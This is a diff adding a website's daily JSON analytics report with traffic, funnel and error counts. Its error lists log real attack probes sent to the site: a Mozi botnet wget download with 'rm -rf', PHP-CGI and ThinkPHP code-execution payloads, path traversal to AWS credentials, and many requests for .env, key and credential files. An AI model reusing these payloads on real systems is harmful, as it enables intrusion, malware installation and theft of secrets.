@@ -1,0 +1,100 @@
+{
+  "date": "2026-09-22",
+  "generated_at": "2026-09-23T02:40:17",
+  "traffic": {
+    "visits": 3,
+    "pageviews": 10,
+    "norm_visits_median_4w": 3,
+    "delta_pct": 0,
+    "sources": [
+      {
+        "source": "vc",
+        "visitors": 2
+      },
+      {
+        "source": "direct",
+        "visitors": 1
+      }
+    ],
+    "tracker_visits": 1,
+    "landing_pages": [
+      {
+        "page": "/register",
+        "visitors": 1
+      },
+      {
+        "page": "/pricing",
+        "visitors": 1
+      },
+      {
+        "page": "/login",
+        "visitors": 1
+      },
+      {
+        "page": "/integrations",
+        "visitors": 1
+      },
+      {
+        "page": "/for-business",
+        "visitors": 1
+      },
+      {
+        "page": "/docs/epf/zakazy-i-otgruzka",
+        "visitors": 1
+      },
+      {
+        "page": "/docs/epf/vozvraty",
+        "visitors": 1
+      },
+      {
+        "page": "/docs",
+        "visitors": 1
+      },
+      {
+        "page": "/",
+        "visitors": 1
+      }
+    ]
+  },
+  "funnel": {
+    "visits": 3,
+    "signups": 0,
+    "contact_requests": 0,
+    "payments": 0,
+    "visit_to_signup_pct": 0.0
+  },
+  "errors": [
+    {
+      "status": 404,
+      "n": 1988,
+      "urls": "/SDK/webLanguage,/.git/config,/shell?cd+/tmp;rm+-rf+*;wget+http://103.26.83.228:59248/Mozi.a;chmod+777+Mozi.a;,/9t8pxqd2wipmbf4x,/actuator/health,/2dvb6fi3id11bc,/.env,/rest/workflows,/backend/.env,/sendgrid.env,/server/.env,/laravel/.env,/.env.example,/phpinfo.php,/core/.env,/wp-config.php,/app/.env,/app_dev.php/_profiler/open?file=app/config/parameters.yml,/.env.save,/appsettings.json,/_profiler/phpinfo,/.env.production,/dev/.env,/staging/.env,/test,/test/.env,/app_dev.php/_profiler/phpinfo,/demo/.env,/docker-compose.yml,/portal/.env,/sendgrid/.env,/crm/.env,/info,/config/.env,/.env.local,/application/.env,/test.php,/.env.development,/.config.yaml,/web/.env,/secrets.env,/.env.bak,/bot/.env,/apis/.env,/API/.env,/frontend/.env,/debug/default/view?panel=config,/local/.env,/back/.env,/media/.env,/.env.prod,/project/.env,/site/.env,/pos/.env,/.env.save.1,/docs/.env,/cms/.env,/config.env,/v1/.env,/erp/.env,/beta/.env,/wp-config.php.backup,/images/.env,/client/.env,/node/.env,/config.ini,/v2/.env,/static/.env,/info.php,/shop/.env,/backup/.env,/blogs/.env,/stage/.env,/library/.env,/platform/.env,/.json,/html/.env,/system/.env,/content/.env,/services/.env,/src/.env,/new/.env,/old/.env,/.env.backup,/public_html/.env,/data/.env,/download/.env,/lara/.env,/service/.env,/Application/.env,/env.example,/Backend/.env,/.env.dev,/home/.env,/main/.env,/facturacion/.env,/blog/.env,/frontend/web/debug/default/view,/app/config/parameters.yml,/aws.yml,/login/.env,/auth/.env,/prod/.env,/env,/store/.env,/sandbox/.env,/Laravel/.env,/config.php.bak,/base/.env,/user/.env,/.env.testing,/index.php?file=../../../../../../../../root/.aws/credentials,/www/.env,/uploads/.env,/saas/.env,/client_secrets.json,/.env.json,/developer/.env,/apps/.env,/v3/.env,/env.json,/twilio.env,/settings.json,/.git/HEAD,/.DS_Store,/.aws/credentials,/.env.old,/dump.sql,/storage/logs/laravel.log,/backup.sql,/k8s/secrets.yaml,/secrets.json,/secrets.yml,/server.key,/settings.py,/terraform.tfstate,/web.config,/database.yml,/db.sql,/debug.log,/docker-compose.yaml,/error.log,/google-services.json,/id_dsa,/id_ecdsa,/id_rsa,/.env.orig,/.env.php,/.env.php.bak,/.env.staging,/.env.test,/.gitlab-ci.yml,/.kube/config,/.svn/entries,/app.log,/app_dev.php/_profiler/.env,/application.properties,/application.yml,/config.json,/config/.env.php,/credentials.json,/database.sql,/yarn.lock,/secrets.yaml,/readme.md,/php_errors.log,/php_error.log,/package.json,/package-lock.json,/mysql.sql,/laravel.log,/kubernetes/secrets.yaml,/database.config,/credentials.ini,/configuration.yaml,/configuration.json,/assets/.env,/cache/.env,/log/.env,/logs/.env,/_next/.env,/_next/.env?,/developmentserver/metadatauploader,/api,/admin,/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input,/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input,/test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input,/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,/vendor/phpunit/src/Util/PHP/eval-stdin.php,/vendor/phpunit/Util/PHP/eval-stdin.php,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/phpunit/phpunit/Util/PHP/eval-stdin.php,/phpunit/src/Util/PHP/eval-stdin.php,/phpunit/Util/PHP/eval-stdin.php,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,/lib/phpunit/src/Util/PHP/eval-stdin.php,/lib/phpunit/Util/PHP/eval-stdin.php,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_arra,/public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_fu,/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create,/index.php?lang=../../../../../../../../tmp/index1,/containers/json,/dispatch.asp,/mjqiiepjpkccdn,/phpinfo/,/info/,/dashboard/.env,/settings/.env,/test/phpinfo/,/infos/,/tmp/,/tests/,/test/,/temp/,/staging/,/old/,/logs/,/log/,/dev/,/demo/,/beta/,/public/.env,/wwwroot/.env,/htdocs/.env,/storage/.env,/tmp/.env,/temp/.env,/administrator/.env,/.env.sample.php,/.env.local.php,/.env.production.php,/config.dev.php,/twilio/.env.php,/sendgrid/.env.php,/.env.php-bak,/.env.php-backup,/.env.php.backup,/test/.env.php,/.env.example.php,/var/.env.local.php,/manage/account/login,/index.html,/+CSCOE+/logon.html,/cgi-bin/login.cgi,/login.htm,/login.html,/login.jsp,/login,/doc/index.html,/remote/login,/web/,/webpages/login.html,/wiki,/,/mcp,/mcp/,/sse,/.docker/secrets.json,/.docker/laravel/app/.env,/.docker/.env,/.boto,/.claude/settings.json,/.config/gcloud/application_default_credentials.json,/.docker/config.json,/.config/anthropic/credentials/default.json,/.aws/credentials.bak,/.config/gcloud/credentials.db,/.aws/config,/.aws/.env,/.anthropic/config.json,/.amplifyrc,/.env-example,/.env-sample,/.env.anthropic,/.env.aws,/.env.dist,/.env.docker,/.env.email,/.env.live,/.env.mail,/.env.openai,/.env.qa,/.env.sample,/.env.swp,/.env~,/.esmtprc,/.git-askpass.sh,/.git-credentials,/.git-secret,/.git/COMMIT_EDITMSG,/.git/FETCH_HEAD,/.git/ORIG_HEAD,/.git/config.bak,/.git/description,/.git/index,/.git/info/exclude,/.git/logs/HEAD,/.git/packed-refs,/.git/refs/heads/main,/.git/refs/heads/master,/.gitconfig,/.github/workflows/ci.yml,/.github/workflows/deploy.yml,/.github/workflows/main.yml,/.gitignore,/.gitlab-ci/variables.yml,/.gitmodules,/.mail.env,/.msmtprc,/.netrc,/.s3cfg,/.smtp.env,/.ssh/authorized_keys,/.ssh/id_rsa,/.ssh/known_hosts,/.terraform.lock.hcl,/.terraform/credentials.tfrc.json,/.terraform/terraform.tfstate,/.wp-config.php.swp,/_profiler/phpinfo.php,/Dockerfile,/app.yaml,/app.yml,/api-backend/.env,/amplify/team-provider-info.json,/app/.env.local,/app/.env.production,/admin-app/.env,/admin_phpinfo.php,/application_default_credentials.json,/appsettings.Development.json,/appsettings.Production.json,/appsettings.QA.json,/appsettings.Staging.json,/aws-credentials.json,/aws-ses.json,/aws.env,/aws.json,/aws.properties,/aws/config/s3.json,/aws/s3/credentials,/aws/ses/smtp.env,/aws/.env,/aws_s3_config.json,/aws.yaml,/client_secret.json,/aws_credentials.ini,/compose.yaml,/circle.yml,/claude_desktop_config.json,/config.php,/config.rb,/config.ts,/config.yaml,/config.yml,/config/aws.json,/config/aws.php,/config/aws.yml,/config/config.inc.php,/config/database.yml,/config/databases.yml,/config/environment.rb,/config/initializers/secret_token.rb,/config/mail.php,/config/parameters.yml,/config/nexmo.php,/config/secrets.yml,/config/stripe.yaml,/config/stripe.php,/config/stripe.json,/credentials.csv,/credentials,/configs/application.ini,/credentials.yaml,/credentials.yml,/current/.env,/elasticsearch.yml,/php.php,/var/www/.env,/1.sql,/webui/,/geoserver/web/,/administrator,//feed/,//xmlrpc.php?rsd,/la5zpmo5veknan3,/_ignition/health-check,/wp-config.php.bak,/actuator/configprops,/wp-config.php~,/crusader-404-probe,/actuator/env,/wp-config.php.swp,/GponForm/diag_Form?images/,/s3.secret,/.build.sh,/yrwz8ofcdsecbp,/2r70beq8tjt6fwt,/rqk5g8wmj7fd5h,/wp-json/batch/v1,/?rest_route=/batch/v1,/.e502,/.env.tmp,/.env.template,/.env.production.local,/.env.development.local,/.env.test.local,/.envrc,/.flaskenv,/private/.env,/var/.env,/docker-compose.override.yml,/docker-compose.dev.yml,/docker-compose.prod.yml,/config.py,/secrets.py,/config/master.key,/wp-config.php.old,/wp-config.php.save,/config/app.php,/application.yaml,/application-dev.properties,/application-prod.properties,/config.toml,/serverless.yml,/serverless.yaml,/config/production.json,/config/development.json,/config/default.json,/config/local.json,/conf/settings.json,/data/config.json,/backups/.env,/.streamlit/secrets.toml,/root/.streamlit/secrets.toml,/root/.aws/credentials,/sellers.json,/aaa9,/aab9,/wp-login.php,/feed,/Dr0v,/rkr3zmki5p52a9,/twilio/.cache/bin/aws/bin/.env,/link/.env,/market_place/mpbackoffice/.env,/saml/extlib/simplesamlphp/.env,/public/.env.development.sample,/.env-cert,/hidden.env,/geral/.env,/.env-clean,/.env-crack,/nvagencies/gst/gst_system/.env,/ctevt/.env,/craft/.env,/certs/.env,/twilio/.config/bin/aws/lib/.env,/.env-flask,/twilio/.config/bin/aws/src/.env,/twilio/env/bin/aws/scripts/.env,/blog1/.env,/auth/.env~,/atoms/.env,/backend/.env.development.sample,/.env-guide,/astro/.env,/appli/.env,/app/.env.2,/app/.env.1,/portfolio/karyabersama_old/.env,/twilio/.ssh/bin/aws/config/.env,/home/ec2-user/.ssh/bin/aws/.env,/wp-content/plugins/prh-api/.env,/.env-junit,/access.env,/.env-karma,/Theme/.env,/.env.mysql,/ferramentas/redemaisbrasil/.env,/.env-mocha,/laravel/.env.development.sample,/.env.npmrc,/.env.token,/.env-proxy,/configurationtionura/.env,/.env_admin,/.env_build,/.env_cache,/.env_cloud,/.env_hooks,/professionaltuning/laravel/.env,/.env_oauth,/.env_token,/.env_vault,/.envs/.env,/.env-setup,/twilio/.config/bin/aws/bin/.env,/.env-store,/.nginx.env,/ws/ec/.env,/whats/.env,/client_billing/authorizenet/.env,/utils/.env,/unity/.env,/twilio/.local/bin/aws/tools/.env,/twill/.env,/app/configurationtion/.env,/trace/.env,/topup/.env,/teste/.env,/home/ec2-user/bin/aws/tools/.env,/safmanagement.it/publichtml/.env,/swift/.env,/twilio/.ssh/bin/aws/scripts/.env,/suite/.env,/spark/.env,/solid/.env,/adv/advDesenvolvimento-1003/.env,/skins/.env,/sitio/.env,/sirim/.env,/server.env,/queue/.env,/twilio/.cache/bin/aws/tools/.env,/proxy/.env,/plesk/.env,/twilio/.conda/bin/aws/tools/.env,/pgnim/.env,/order/.env,/odata/.env,/imadguennouni/all/spotbills/.env,/.env.admin,/lunar/.env,/afasio/afasio/backend_Julia/.env,/lobby/.env,/lib64/.env,/kevin/.env,/james/.env,/administrateur/.env.staging,/ibfv1/.env,/infophp.php,/infos.php,/env.yaml,/node-api/.env,/opt/mailcow-dockerized/mailcow.conf,/netlify.toml,/payment/stripe.json,/payment_gateways/stripe.yaml,/php-info.php,/php_info.php,/phpinfo,/production/.env,/public/phpinfo.php,/s3/credentials,/s3.properties,/s3.key,/plugins/payments/stripe.json,/sam-template.yaml,/s3.yml,/server/api/.env,/s3.yaml,/server/backend/.env,/settings.ini,/settings.yaml,/stripe.env,/symfony/_profiler/phpinfo,/stripe-credentials.json,/stripe-keys.json,/buildspec.yml,/stripe.json,/stripe.yaml,/composer.lock,/db.bak,/database-config.json,/dbdump.bak,/.env.example-local,/nginx-status"
+    },
+    {
+      "status": 429,
+      "n": 257,
+      "urls": "/public/.env,/wwwroot/.env,/htdocs/.env,/storage/.env,/tmp/.env,/temp/.env,/administrator/.env,/.env.sample.php,/.env.local.php,/.env.production.php,/config.dev.php,/twilio/.env.php,/sendgrid/.env.php,/.env.php-bak,/.env.php-backup,/.env.php.backup,/test/.env.php,/.env.example.php,/var/.env.local.php,/env.yaml,/info.php,/infophp.php,/infos.php,/laravel/.env,/media/.env,/netlify.toml,/new/.env,/node-api/.env,/old/.env,/opt/mailcow-dockerized/mailcow.conf,/payment/stripe.json,/payment_gateways/stripe.yaml,/php-info.php,/php_info.php,/phpinfo,/phpinfo.php,/plugins/payments/stripe.json,/prod/.env,/production/.env,/public/phpinfo.php,/public_html/.env,/s3.key,/s3.properties,/s3.secret,/s3.yaml,/s3.yml,/s3/credentials,/sam-template.yaml,/secrets.yaml,/sendgrid.env,/server/.env,/server/api/.env,/server/backend/.env,/serverless.yaml,/serverless.yml,/settings.ini,/settings.py,/settings.yaml,/src/.env,/staging/.env,/stripe-credentials.json,/stripe-keys.json,/stripe.env,/stripe.json,/stripe.yaml,/stripe/.env,/stripe/config.json,/stripe/webhook_secret.env,/symfony/_profiler/phpinfo,/template.yaml,/terraform.tfstate,/terraform.tfstate.backup,/terraform.tfvars,/terraform/terraform.tfvars.json,/test/.env,/v1/.env,/v2/.env,/v3/.env,/var/www/html/.env,/vercel.json,/web/.env,/wp-config.php,/wp-config.php.bak,/wp-config.php.new,/wp-config.php.old,/wp-content/debug.log,/wp-content/mysql.sql,/wp_mail_smtp.ini,/data.sql,/model/info,/mysqldump.bak,/.env.ci,/stage/.env,/Rexfile,/.env.save.1,/s3/.aws/config,/.azure/accessTokens.json,/.config/gcloud/configurations/config_default,/.p12,/aws_credentials,/.env.zip,/_netrc,/.secrets.yml,/ssh-config.json,/config/aws.ini,/.jenkins.sh,/srv/.env,/configs.json,/app/settings.py,/.env_copy,/.aws/credentials.old,/.git/logs/refs/remotes/origin/main,/~/.s3cfg,/elasticsearch.yml,/env,/frontend/.env,/id_rsa,/php.php,/settings.json,/var/www/.env,/docker/registry/config.yml,/.env.3,/gcp.json,/shop/.env,/CVS/Root,/.pre-commit-config.yaml,/service/.env,/.circleci/ssh-config,/key.pem,/settings.php,/data.bak,/.env-backup,/config.production.json,/.renovaterc.json,/ventrilo_srv.ini,/storage/ovh-backups.json,/logs/development.log,/config/credentials.yml.enc,/data.zip,/service-account-file.json,/__clockwork/app,/error_log,/.env.4,/.git/logs/refs/heads/main,/_darcs/prefs/binaries,/.pypirc,/wp-content/uploads/.env,/marketing/.env,/secret_token.rb,/constants.json,/api-node/.env,/privkey.pem,/.github/workflows/docker.yml,/database_credentials.inc,/.stestr.conf,/src/config/environment.json,/inc/data/database.sdb,/en/.env,/sftp.json,/service-account-credentials.json,/cgi-bin/printenv.pl,/var/task/netlify.toml"
+    },
+    {
+      "status": 400,
+      "n": 30,
+      "urls": "/,/cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31.56.3,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32,/../.env,/../../.env,/MtOL,/onvif/device_service,/aaa9,/aab9"
+    },
+    {
+      "status": 405,
+      "n": 9,
+      "urls": "/,/?rest_route=/batch/v1"
+    },
+    {
+      "status": 499,
+      "n": 1,
+      "urls": "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"
+    }
+  ],
+  "crawlers": {},
+  "notes": [
+    "визит = уникальный visitor_id за сутки по логам nginx",
+    "робот отсекается по UA, по загрузке site.css и по поведению (mark_bots)",
+    "tracker_visits — те же визиты глазами своего счётчика, для сверки, не для сложения",
+    "регистрации, заявки и оплаты взяты из platform.*, а не из событий сайта"
+  ]
+}
